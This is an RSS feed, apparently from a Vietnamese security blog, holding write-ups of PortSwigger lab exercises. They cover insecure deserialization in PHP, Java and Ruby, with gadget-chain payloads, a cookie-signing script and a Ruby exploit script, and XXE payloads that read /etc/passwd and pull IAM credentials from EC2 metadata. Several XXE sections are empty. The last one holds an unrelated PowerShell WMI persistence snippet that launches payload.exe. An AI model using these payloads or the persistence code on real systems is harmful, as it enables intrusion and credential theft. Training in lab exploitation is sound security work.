+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveTemplate</span>($template) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isTemplateLocked</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Carlos thought this would be a good idea
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Một class <code>CustomTemplate</code> được định nghĩa với 2 thuộc tính <code>template_file_path</code> và <code>lock_file_path</code>. Ta chỉ cần quan tâm <a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener noreffer">magic method</a>
+ <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
+<p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
+<pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và edit cookie:</p>
+<p></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
+<h3 id="description-4">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
+To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<p>Cookie của ứng dụng là một Java serialize Object</p>
+<p></p>
+<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
+ để khai thác.</p>
+<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
+</span></span></code></pre></div><p></p>
+<p>Sử dụng payload vừa tạo và send request</p>
+<p></p>
+<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
+<p></p>
+<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
+<h3 id="description-5">Description</h3>
+<blockquote>
+<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
+To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
+</p>
+<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
+<p></p>
+<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
+<p></p>
+<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
+Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
+<p></p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><p></p>
+<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
+<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
+<p></p>
+<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
+<p></p>
+<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
+<pre tabindex="0"><code>&lt;?php
+$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
+$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
+$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);
+
+$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
+print_r($cookie);
+?&gt;
+</code></pre><p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
+<h3 id="description-6">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
+To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Session cookie là một <code>Ruby deserialize Object</code></p>
+<p></p>
+<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
+.</p>
+<p>Script có nội dung như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
+</span></span></code></pre></div><p></p>
+<p>Thay cookie và gửi request</p>
+<p></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>PortSwigger - XXE</title>
+    <link>https://g03m0n.github.io/posts/portswigger---xxe/portswigger-xxe/</link>
+    <pubDate>Mon, 21 Aug 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---xxe/portswigger-xxe/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.</p>
+</blockquote>
+<h2 id="exploitation">Exploitation</h2>
+<p>Ứng dụng có chức năng kiểm tra hàng tồn kho tại mỗi post của sản phẩm</p>
+<p>Khi click <code>Check stock</code>, một POST request gửi đến <code>/product/stock</code> với body là một dạng XML gồm 2 trường query chính là <code>productId</code> và <code>storeId</code>. Server sẽ trả về số lượng sản phẩm còn lại trong kho.</p>
+<p></p>
+<p>Tại đây, server không có một cơ chế <code>validate</code> XML nào nên ta có thể định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là nội dung file <code>/etc/passwd</code> và sử dụng <code>entity</code> <code>&amp;xxe;</code> tại trường <code>productId</code>.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="description-1">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
+The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server&rsquo;s IAM secret access key from the EC2 metadata endpoint.</p>
+</blockquote>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Tương tự bài trên, ta sẽ thực hiện <code>SSRF attack</code> để định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là <code>http://169.254.169.254/</code> và sử dụng <code>entity</code> tại trường <code>productId</code>.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p></p>
+<p>Tìm ra được folder <code>latest</code></p>
+<p></p>
+<p>Sử dụng đường dẫn trên kết hợp với folder <code>latest</code> ta được:</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p></p>
+<p>Lặp đi lặp lại các bước ta tìm ra được endpoint <code>admin</code>: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></p>
+<p>Payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34; &gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="3-blind-xxe-with-out-of-band-interaction">3. Blind XXE with out-of-band interaction</h2>
+<h3 id="description-2">Description</h3>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input but does not display the result.
+You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
+To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Đây là một bài lab <code>Blind XXE injection</code>, server không trả về kết quả attacker mong muốn. Vì vậy ta có thể sử dụng kĩ thuật <code>out-of-band</code> sau để tiến hành khai thác.
+Payload</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;http://&lt;COLABORATOR_DOMAIN&gt;&#34;&gt;]&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
+    &lt;storeId&gt; 2 &lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre><p></p>
+<p>Solved</p>
+<p></p>
+<h3 id="description-3">Description</h3>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h3 id="exploitation-3">Exploitation</h3>
+<h2 id="description-4">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-4">Exploitation</h2>
+<h2 id="description-5">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-5">Exploitation</h2>
+<h2 id="description-6">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-6">Exploitation</h2>
+<h2 id="description-7">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-7">Exploitation</h2>
+<h2 id="description-8">Description</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="exploitation-8">Exploitation</h2>
+<p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
+]]></description>
+</item>
+</channel>
+</rss>
